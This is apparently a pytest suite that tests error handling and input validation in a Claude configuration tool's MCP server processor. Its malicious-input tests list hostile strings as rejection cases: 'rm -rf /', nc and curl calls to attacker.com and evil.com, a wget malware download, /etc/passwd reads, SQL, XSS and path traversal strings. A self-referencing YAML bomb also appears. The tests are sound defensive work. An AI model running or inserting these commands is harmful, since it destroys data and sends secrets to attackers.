"""
Comprehensive Error Scenario and Edge Case Tests

Tests error handling, edge cases, and system resilience under adverse conditions.
"""

import pytest
import tempfile
import os
import signal
import threading
import time
from pathlib import Path
from unittest.mock import patch, MagicMock
import yaml
import json
import subprocess

from src.claude_config.mcp_processor import MCPProcessor
from src.claude_config.composer import AgentComposer
from src.claude_config.validator import ConfigValidator
from src.claude_config.env_injector import EnvironmentInjector


class TestFileSystemErrors:
    """Test handling of file system related errors."""

    def test_permission_denied_on_read(self):
        """Test handling when file permissions deny read access."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            # Create a file and then remove read permissions
            config_file = mcp_dir / "permission-test.yaml"
            config = {
                "name": "permission-test",
                "display_name": "Permission Test",
                "description": "Test permission handling",
                "category": "development",
                "server": {"command": "test", "args": []},
                "security": {"trust_level": "trusted", "network_access": False},
                "development": {"status": "stable"}
            }
            
            with open(config_file, 'w') as f:
                yaml.dump(config, f)

            # Remove read permissions
            config_file.chmod(0o000)
            
            try:
                processor = MCPProcessor(data_dir)
                
                with pytest.raises((PermissionError, OSError)):
                    processor.load_mcp_server("permission-test")
                    
            finally:
                # Restore permissions for cleanup
                config_file.chmod(0o644)

    def test_disk_full_simulation(self):
        """Test handling when disk space is exhausted."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            
            # Mock OSError for disk full
            with patch('builtins.open', side_effect=OSError("No space left on device")):
                processor = MCPProcessor(data_dir)
                
                with pytest.raises(OSError, match="No space left on device"):
                    processor.load_mcp_server("nonexistent")

    def test_corrupted_file_handling(self):
        """Test handling of corrupted files."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            # Create corrupted files
            test_cases = [
                ("binary-corruption.yaml", b"\x00\x01\x02\x03\x04\x05"),  # Binary data
                ("unicode-corruption.yaml", "name: test\n\x80\x81\x82"),  # Invalid UTF-8
                ("partial-yaml.yaml", "name: test\ndisplay_name: "),      # Incomplete YAML
                ("mixed-encoding.yaml", "name: test\ndisplay_name: caf\xe9"),  # Mixed encoding
            ]

            for filename, content in test_cases:
                file_path = mcp_dir / filename
                if isinstance(content, bytes):
                    with open(file_path, 'wb') as f:
                        f.write(content)
                else:
                    with open(file_path, 'w', encoding='latin1') as f:
                        f.write(content)

                processor = MCPProcessor(data_dir)
                server_name = filename.replace('.yaml', '')
                
                # Should handle corruption gracefully
                with pytest.raises((UnicodeDecodeError, yaml.YAMLError, ValueError)):
                    processor.load_mcp_server(server_name)

    def test_missing_directories(self):
        """Test handling when expected directories don't exist."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            # Don't create mcp_servers directory
            
            processor = MCPProcessor(data_dir)
            
            # Should handle missing directory gracefully
            servers = processor.list_available_servers()
            assert servers == []
            
            all_servers = processor.load_all_mcp_servers()
            assert all_servers == {}

    def test_circular_symlinks(self):
        """Test handling of circular symlinks."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            # Create circular symlinks
            link1 = mcp_dir / "link1.yaml"
            link2 = mcp_dir / "link2.yaml"
            
            link1.symlink_to(link2)
            link2.symlink_to(link1)

            processor = MCPProcessor(data_dir)
            
            # Should handle circular symlinks without infinite loops
            with pytest.raises((OSError, RecursionError)):
                processor.load_mcp_server("link1")


class TestNetworkAndIOErrors:
    """Test handling of network and I/O related errors."""

    def test_network_timeout_in_environment_resolution(self):
        """Test network timeouts during environment variable resolution."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            config = {
                "name": "network-timeout-server",
                "display_name": "Network Timeout Server",
                "description": "Server that causes network timeouts",
                "category": "development",
                "server": {"command": "test", "args": []},
                "environment": {
                    "variables": {
                        "NETWORK_VAR": {
                            "source": "command",
                            "command": "curl --max-time 1 httpbin.org/delay/10",
                            "required": True
                        }
                    }
                },
                "security": {"trust_level": "trusted", "network_access": True},
                "development": {"status": "experimental"}
            }
            
            with open(mcp_dir / "network-timeout-server.yaml", 'w') as f:
                yaml.dump(config, f)

            processor = MCPProcessor(data_dir)
            
            # Mock subprocess to simulate timeout
            with patch('subprocess.run', side_effect=subprocess.TimeoutExpired("curl", 1)):
                result = processor.validate_mcp_server("network-timeout-server")
                
                # Should handle timeout gracefully
                assert not result.is_valid
                assert any("timeout" in error.lower() for error in result.errors)

    def test_dns_resolution_failures(self):
        """Test DNS resolution failures in environment commands."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            config = {
                "name": "dns-failure-server",
                "display_name": "DNS Failure Server", 
                "description": "Server with DNS resolution issues",
                "category": "development",
                "server": {"command": "test", "args": []},
                "environment": {
                    "variables": {
                        "DNS_VAR": {
                            "source": "command",
                            "command": "nslookup nonexistent.invalid.domain.xyz",
                            "required": True
                        }
                    }
                },
                "security": {"trust_level": "trusted", "network_access": True},
                "development": {"status": "experimental"}
            }
            
            with open(mcp_dir / "dns-failure-server.yaml", 'w') as f:
                yaml.dump(config, f)

            processor = MCPProcessor(data_dir)
            
            # Should handle DNS failures gracefully
            result = processor.validate_mcp_server("dns-failure-server")
            assert not result.is_valid or len(result.errors) > 0

    def test_interrupted_operations(self):
        """Test handling of interrupted operations."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            # Create a large configuration
            config = {
                "name": "interrupt-test-server",
                "display_name": "Interrupt Test Server",
                "description": "Server for testing interruption handling",
                "category": "development",
                "server": {"command": "test", "args": []},
                "environment": {
                    "variables": {
                        f"VAR_{i}": f"value_{i}" for i in range(1000)
                    }
                },
                "security": {"trust_level": "trusted", "network_access": False},
                "development": {"status": "stable"}
            }
            
            with open(mcp_dir / "interrupt-test-server.yaml", 'w') as f:
                yaml.dump(config, f)

            def interrupt_after_delay():
                time.sleep(0.1)  # Short delay
                os.kill(os.getpid(), signal.SIGINT)

            processor = MCPProcessor(data_dir)
            
            # Start interrupt thread
            interrupt_thread = threading.Thread(target=interrupt_after_delay)
            interrupt_thread.start()
            
            try:
                # This should be interrupted
                with pytest.raises(KeyboardInterrupt):
                    time.sleep(1)  # Simulate long operation
                    processor.process_all_for_claude_code()
                    
            finally:
                interrupt_thread.join()


class TestDataIntegrityErrors:
    """Test data integrity and validation errors."""

    def test_yaml_bomb_protection(self):
        """Test protection against YAML bombs (exponential expansion)."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            # Create YAML with potential for exponential expansion
            yaml_bomb = """
name: yaml-bomb-server
display_name: &anchor "YAML Bomb Server"
description: *anchor
category: development
server:
  command: test
  args: []
large_structure: &big_anchor
  - <<: *big_anchor
  - <<: *big_anchor
  - <<: *big_anchor
  - <<: *big_anchor
security:
  trust_level: trusted
  network_access: false
development:
  status: experimental
"""
            
            with open(mcp_dir / "yaml-bomb-server.yaml", 'w') as f:
                f.write(yaml_bomb)

            processor = MCPProcessor(data_dir)
            
            # Should handle YAML bombs safely (may timeout or raise error)
            try:
                server_def = processor.load_mcp_server("yaml-bomb-server")
                # If it loads, it should be reasonable size
                assert len(str(server_def)) < 10 * 1024 * 1024  # < 10MB
            except (yaml.YAMLError, RecursionError, MemoryError):
                # These are acceptable responses to YAML bombs
                pass

    def test_deeply_nested_structures(self):
        """Test handling of deeply nested data structures."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            # Create deeply nested structure
            nested_dict = {"level": 0}
            current = nested_dict
            for i in range(100):  # 100 levels deep
                current["next"] = {"level": i + 1}
                current = current["next"]

            config = {
                "name": "deep-nesting-server",
                "display_name": "Deep Nesting Server",
                "description": "Server with deeply nested structure",
                "category": "development", 
                "server": {"command": "test", "args": []},
                "metadata": {
                    "nested_data": nested_dict
                },
                "security": {"trust_level": "trusted", "network_access": False},
                "development": {"status": "experimental"}
            }
            
            with open(mcp_dir / "deep-nesting-server.yaml", 'w') as f:
                yaml.dump(config, f)

            processor = MCPProcessor(data_dir)
            
            # Should handle deep nesting without stack overflow
            try:
                server_def = processor.load_mcp_server("deep-nesting-server")
                assert server_def.name == "deep-nesting-server"
            except RecursionError:
                # Acceptable if recursion limit hit
                pass

    def test_invalid_unicode_handling(self):
        """Test handling of invalid Unicode sequences."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            # Test cases with problematic Unicode
            test_cases = [
                ("surrogate-pairs.yaml", {
                    "name": "unicode-test-1",
                    "display_name": "Test \ud800\udc00",  # Valid surrogate pair
                    "description": "Unicode test",
                    "category": "development",
                    "server": {"command": "test", "args": []},
                    "security": {"trust_level": "trusted", "network_access": False},
                    "development": {"status": "stable"}
                }),
                ("emoji-heavy.yaml", {
                    "name": "unicode-test-2", 
                    "display_name": "Test 🔥💻🚀⚡🎯🌟💡🔧🎉🏆",
                    "description": "Emoji heavy description 😀😃😄😁😆😅😂🤣",
                    "category": "development",
                    "server": {"command": "test", "args": []},
                    "security": {"trust_level": "trusted", "network_access": False},
                    "development": {"status": "stable"}
                })
            ]

            for filename, config in test_cases:
                with open(mcp_dir / filename, 'w', encoding='utf-8') as f:
                    yaml.dump(config, f, allow_unicode=True)

                processor = MCPProcessor(data_dir)
                server_name = filename.replace('.yaml', '').replace('-', '_')
                
                # Should handle Unicode correctly
                server_def = processor.load_mcp_server(config["name"])
                assert server_def.name == config["name"]

    def test_extremely_large_values(self):
        """Test handling of extremely large configuration values."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers" 
            mcp_dir.mkdir()

            # Create config with very large string values
            large_string = "x" * (1024 * 1024)  # 1MB string
            
            config = {
                "name": "large-values-server",
                "display_name": "Large Values Server",
                "description": large_string,  # Very large description
                "category": "development",
                "server": {"command": "test", "args": []},
                "environment": {
                    "variables": {
                        "LARGE_VAR": large_string
                    }
                },
                "security": {"trust_level": "trusted", "network_access": False},
                "development": {"status": "experimental"}
            }
            
            with open(mcp_dir / "large-values-server.yaml", 'w') as f:
                yaml.dump(config, f)

            processor = MCPProcessor(data_dir)
            
            # Should handle large values (may be slow but shouldn't crash)
            server_def = processor.load_mcp_server("large-values-server")
            assert server_def.name == "large-values-server"
            assert len(server_def.description) == 1024 * 1024


class TestConcurrencyErrors:
    """Test error handling in concurrent scenarios."""

    def test_race_condition_in_file_access(self):
        """Test race conditions when multiple processes access same files."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            config = {
                "name": "race-condition-server",
                "display_name": "Race Condition Server",
                "description": "Server for testing race conditions",
                "category": "development",
                "server": {"command": "test", "args": []},
                "security": {"trust_level": "trusted", "network_access": False},
                "development": {"status": "stable"}
            }
            
            config_file = mcp_dir / "race-condition-server.yaml"
            with open(config_file, 'w') as f:
                yaml.dump(config, f)

            def load_and_modify():
                """Load config and modify file simultaneously."""
                processor = MCPProcessor(data_dir)
                
                # Load server
                server_def = processor.load_mcp_server("race-condition-server")
                
                # Modify file while other threads are loading
                modified_config = config.copy()
                modified_config["description"] = f"Modified at {time.time()}"
                
                with open(config_file, 'w') as f:
                    yaml.dump(modified_config, f)
                    
                return server_def

            # Run multiple threads that load and modify simultaneously
            import concurrent.futures
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(load_and_modify) for _ in range(10)]
                results = []
                
                for future in concurrent.futures.as_completed(futures):
                    try:
                        result = future.result()
                        results.append(result)
                    except Exception as e:
                        # Some operations may fail due to race conditions
                        results.append(e)

            # At least some operations should succeed
            successful_results = [r for r in results if not isinstance(r, Exception)]
            assert len(successful_results) >= 5, "Too many operations failed due to race conditions"

    def test_deadlock_prevention(self):
        """Test that system doesn't deadlock under concurrent load."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            # Create multiple server configs
            for i in range(10):
                config = {
                    "name": f"deadlock-test-server-{i}",
                    "display_name": f"Deadlock Test Server {i}",
                    "description": "Server for deadlock testing",
                    "category": "development",
                    "server": {"command": "test", "args": []},
                    "environment": {
                        "variables": {
                            "CROSS_REF": {
                                "source": "env",
                                "variable": f"DEADLOCK_VAR_{(i + 1) % 10}",  # Circular reference
                                "required": True
                            }
                        }
                    },
                    "security": {"trust_level": "trusted", "network_access": False},
                    "development": {"status": "stable"}
                }
                
                with open(mcp_dir / f"deadlock-test-server-{i}.yaml", 'w') as f:
                    yaml.dump(config, f)

            def process_with_locks():
                """Process servers with potential for deadlock."""
                processor = MCPProcessor(data_dir)
                
                # Set up environment
                env_vars = {f"DEADLOCK_VAR_{i}": f"value_{i}" for i in range(10)}
                with patch.dict(os.environ, env_vars):
                    # Process multiple servers that reference each other
                    results = []
                    for i in range(10):
                        try:
                            server_def = processor.load_mcp_server(f"deadlock-test-server-{i}")
                            claude_config = processor.process_for_claude_code(server_def)
                            results.append(claude_config)
                        except Exception as e:
                            results.append(e)
                    return results

            # Use timeout to detect deadlocks
            import signal
            
            def timeout_handler(signum, frame):
                raise TimeoutError("Operation timed out - possible deadlock")
                
            signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(30)  # 30 second timeout
            
            try:
                results = process_with_locks()
                signal.alarm(0)  # Cancel timeout
                
                # Should complete without deadlock
                assert len(results) == 10
                
            except TimeoutError:
                pytest.fail("Operation timed out - possible deadlock detected")
            finally:
                signal.alarm(0)  # Ensure timeout is cancelled


class TestResourceExhaustionErrors:
    """Test handling of resource exhaustion scenarios."""

    def test_memory_pressure_handling(self):
        """Test behavior under memory pressure."""
        # Simulate memory pressure by creating large objects
        large_objects = []
        
        try:
            # Allocate memory until we have pressure
            for i in range(100):
                large_objects.append(bytearray(10 * 1024 * 1024))  # 10MB each
                
                # Test normal operation under memory pressure
                with tempfile.TemporaryDirectory() as temp_dir:
                    data_dir = Path(temp_dir)
                    mcp_dir = data_dir / "mcp_servers"
                    mcp_dir.mkdir()

                    config = {
                        "name": "memory-pressure-server",
                        "display_name": "Memory Pressure Server",
                        "description": "Server under memory pressure",
                        "category": "development",
                        "server": {"command": "test", "args": []},
                        "security": {"trust_level": "trusted", "network_access": False},
                        "development": {"status": "stable"}
                    }
                    
                    with open(mcp_dir / "memory-pressure-server.yaml", 'w') as f:
                        yaml.dump(config, f)

                    processor = MCPProcessor(data_dir)
                    
                    # Should still work under memory pressure
                    server_def = processor.load_mcp_server("memory-pressure-server")
                    assert server_def.name == "memory-pressure-server"
                    
                    # Stop when we've tested under pressure
                    if i >= 10:  # Test with ~100MB allocated
                        break
                        
        except MemoryError:
            # This is expected when we exhaust memory
            pass
        finally:
            # Clean up memory
            large_objects.clear()

    def test_file_descriptor_exhaustion(self):
        """Test handling when file descriptors are exhausted."""
        # Get current limit
        import resource
        
        original_limit = resource.getrlimit(resource.RLIMIT_NOFILE)
        
        try:
            # Set a low file descriptor limit
            resource.setrlimit(resource.RLIMIT_NOFILE, (20, original_limit[1]))
            
            with tempfile.TemporaryDirectory() as temp_dir:
                data_dir = Path(temp_dir)
                mcp_dir = data_dir / "mcp_servers"
                mcp_dir.mkdir()

                # Create many files
                for i in range(50):  # More than our limit
                    config = {
                        "name": f"fd-exhaustion-server-{i}",
                        "display_name": f"FD Exhaustion Server {i}",
                        "description": "Server for FD exhaustion testing",
                        "category": "development",
                        "server": {"command": "test", "args": []},
                        "security": {"trust_level": "trusted", "network_access": False},
                        "development": {"status": "stable"}
                    }
                    
                    with open(mcp_dir / f"fd-exhaustion-server-{i}.yaml", 'w') as f:
                        yaml.dump(config, f)

                processor = MCPProcessor(data_dir)
                
                # Should handle FD exhaustion gracefully
                try:
                    all_servers = processor.load_all_mcp_servers()
                    # May not load all servers due to FD limit
                    assert len(all_servers) > 0
                except OSError as e:
                    # Expected when FDs exhausted
                    assert "Too many open files" in str(e) or "file descriptor" in str(e).lower()
                    
        finally:
            # Restore original limit
            resource.setrlimit(resource.RLIMIT_NOFILE, original_limit)


class TestMaliciousInputHandling:
    """Test handling of potentially malicious inputs."""

    def test_script_injection_prevention(self):
        """Test prevention of script injection in configuration values."""
        with tempfile.TemporaryDirectory() as temp_dir:
            data_dir = Path(temp_dir)
            mcp_dir = data_dir / "mcp_servers"
            mcp_dir.mkdir()

            # Test various injection attempts
            injection_attempts = [
                "'; rm -rf /; echo '",
                "$(rm -rf /)",
                "`rm -rf /`",
                "${IFS}rm${IFS}-rf${IFS}/",
                "| nc attacker.com 4444",
                "&& curl attacker.com/steal",
                "; wget -O /tmp/evil http://evil.com/malware",
                "' OR '1'='1",
                "<script>alert('xss')</script>",
                "../../../etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ]

            for i, injection in enumerate(injection_attempts):
                config = {
                    "name": f"injection-test-{i}",
                    "display_name": f"Injection Test {injection}",
                    "description": f"Server with injection attempt: {injection}",
                    "category": "development",
                    "server": {
                        "command": "test",
                        "args": [injection]  # Injection in args
                    },
                    "environment": {
                        "variables": {
                            "INJECTION_VAR": {
                                "source": "command",
                                "command": f"echo {injection}",  # Injection in command
                                "required": False
                            }
                        }
                    },
                    "security": {"trust_level": "untrusted", "network_access": False},
                    "development": {"status": "experimental"}
                }
                
                with open(mcp_dir / f"injection-test-{i}.yaml", 'w') as f:
                    yaml.dump(config, f)

                processor = MCPProcessor(data_dir)
                
                # Should detect and reject dangerous inputs
                result = processor.validate_mcp_server(f"injection-test-{i}")
                
                # Should either reject or safely handle injection attempts
                if result.is_valid:
                    # If considered valid, processing should be safe
                    server_def = processor.load_mcp_server(f"injection-test-{i}")
                    claude_config = processor.process_for_claude_code(server_def)
                    
                    # Verify no actual injection occurred
                    config_str = str(claude_config)
                    assert "rm -rf /" not in config_str
                    assert "nc attacker.com" not in config_str

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        injector = EnvironmentInjector()
        
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]

        for attempt in path_traversal_attempts:
            # Should reject all path traversal attempts
            assert not injector._validate_file_path(attempt), f"Should reject path traversal: {attempt}"

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        injector = EnvironmentInjector()
        
        command_injection_attempts = [
            "whoami; rm -rf /",
            "whoami && cat /etc/passwd", 
            "whoami || wget evil.com/script",
            "whoami | nc attacker.com 4444",
            "whoami > /dev/null; curl evil.com",
            "whoami `cat /etc/passwd`",
            "whoami $(curl evil.com/cmd)",
            "eval(\"import os; os.system('rm -rf /')\")",
            "/bin/bash -c 'rm -rf /'",
            "python -c \"__import__('os').system('rm -rf /')\""
        ]

        for attempt in command_injection_attempts:
            # Should reject all command injection attempts
            assert not injector._validate_command(attempt), f"Should reject command injection: {attempt}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])